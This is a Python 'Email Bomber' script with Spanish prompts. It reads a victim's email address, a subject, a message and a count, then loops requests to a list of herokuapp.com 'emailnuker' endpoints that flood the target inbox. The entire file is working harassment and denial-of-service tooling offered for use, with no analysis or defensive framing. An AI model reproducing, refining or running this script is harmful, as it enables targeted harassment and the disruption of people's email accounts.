import requests 
import random
import os 
import time
# os.system("bash wake.sh &")
time.sleep(2)
os.system("clear")
print("\n")
print("**************************")
print("*      Email Bomber      *")
print("* ╚» Sʜᴀᴅᴏᴡ Cᴀᴘᴛᴀɪɴ ☬ «╝ *")
print("**************************")
to=str(input("Ingrese el correo electronico a bombardear:"))
sub=str(input("Ingresar asunto:"))
msg=str(input("Ingresar mensaje:"))
msg=msg.replace(" ","%20")
sub=sub.replace(" ","%20")
srvrlist={1:"https://nnewemailnuker.herokuapp.com/1",2:"https://nnewemailnuker.herokuapp.com/2",3:"https://nnewemailnuker.herokuapp.com/18",4:"https://nnewemailnuker.herokuapp.com/4",5:"https://nnewemailnuker.herokuapp.com/5",6:"https://nnewemailnuker.herokuapp.com/6",7:"https://nnewemailnuker.herokuapp.com/7",8:"https://nnewemailnuker.herokuapp.com/8",9:"https://nnewemailnuker.herokuapp.com/9",10:"https://nnewemailnuker.herokuapp.com/10",11:"https://nnewemailnuker.herokuapp.com/11",12:"https://nnewemailnuker.herokuapp.com/12",13:"https://nnewemailnuker.herokuapp.com/13",14:"https://nnewemailnuker.herokuapp.com/14",15:"https://nnewemailnuker.herokuapp.com/15",16:"https://nnewemailnuker.herokuapp.com/16",17:"https://nnewemailnuker.herokuapp.com/17",18:"https://nnewemailnuker.herokuapp.com/18",19:"https://nnewemailnuker.herokuapp.com/1",20:"https://nnewemailnuker.herokuapp.com/2",21:"https://nnewemailnuker.herokuapp.com/2"}
am=int(input("Ingrese la cantidad de mensajes a enviar:"))
for i in range(0,am): 
    srvr=random.randint(1,21)
    req=requests.get(srvrlist.get(srvr)+"/bomb/"+to+"/"+sub+"/"+msg)
    if req.text=="Sent": 
        print("           ")
        print (str(i+1)+" Mensajes enviados")
    else: 
        print ("No se pudo enviar el mensaje")
        print("Por favor informe este error al desarrollador")
        print("La respuesta guardada del servidor fue:"+str(srvr)+req.text)
        break
